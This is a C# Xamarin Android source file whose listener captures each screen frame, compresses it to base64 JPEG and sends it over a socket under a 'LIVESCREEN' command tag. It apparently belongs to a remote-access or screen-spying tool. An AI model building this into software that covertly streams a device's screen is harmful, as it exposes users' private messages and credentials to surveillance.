using System;
using Android.Media;
using Java.Interop;
using Java.IO;
using Java.Nio;

namespace Task2
{
    class ImageAvailableListener : Java.Lang.Object, ImageReader.IOnImageAvailableListener
    {
        public IntPtr Handle;

        public int JniIdentityHashCode;

        public JniObjectReference PeerReference;

        public JniPeerMembers JniPeerMembers;

        public JniManagedPeerStates JniManagedPeerState;

        public static int kalite = 70;
        public void Dispose()
        {
            
        }

        public void Disposed()
        {
           
        }

        public void DisposeUnlessReferenced()
        {
           
        }

        public void Finalized()
        {
            
        }
        public void OnImageAvailable(ImageReader reader)
        {
            Android.Media.Image image = null;
         
            Android.Graphics.Bitmap bitmap = null;
            try
            {
                image = reader.AcquireLatestImage();
                if (image != null)
                {
                    Image.Plane[] planes = image.GetPlanes();
                    ByteBuffer buffer = planes[0].Buffer;
                    int offset = 0;
                    int pixelStride = planes[0].PixelStride;
                    int rowStride = planes[0].RowStride;
                    int rowPadding = rowStride - pixelStride * MainActivity.mWidth;
                    // create bitmap
                    bitmap = Android.Graphics.Bitmap.CreateBitmap(MainActivity.mWidth + rowPadding / pixelStride, MainActivity.mHeight, Android.Graphics.Bitmap.Config.Argb8888);
                    bitmap.CopyPixelsFromBuffer(buffer);
                    image.Close();
                    using (System.IO.MemoryStream fos = new System.IO.MemoryStream()) {
                        bitmap.Compress(Android.Graphics.Bitmap.CompressFormat.Jpeg, kalite, fos);
                        ((MainActivity)MainActivity.global_activity).soketimizeGonder("LIVESCREEN", $"[VERI]{Convert.ToBase64String(fos.ToArray())}[0x09]");
                        //System.IO.File.WriteAllBytes(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/myscreen_" + IMAGES_PRODUCED + ".jpg", fos.ToArray());
                    }
                }

            }
            catch (Exception)
            {
               
            }
            finally
            {
               

                if (bitmap != null)
                {
                    bitmap.Recycle();
                }

                if (image != null)
                {
                    image.Close();
                }
            }
        }

        public void SetJniIdentityHashCode(int value)
        {
           
        }

        public void SetJniManagedPeerState(JniManagedPeerStates value)
        {
           
        }

        public void SetPeerReference(JniObjectReference reference)
        {
            
        }

        public void UnregisterFromRuntime()
        {
          
        }
    }
}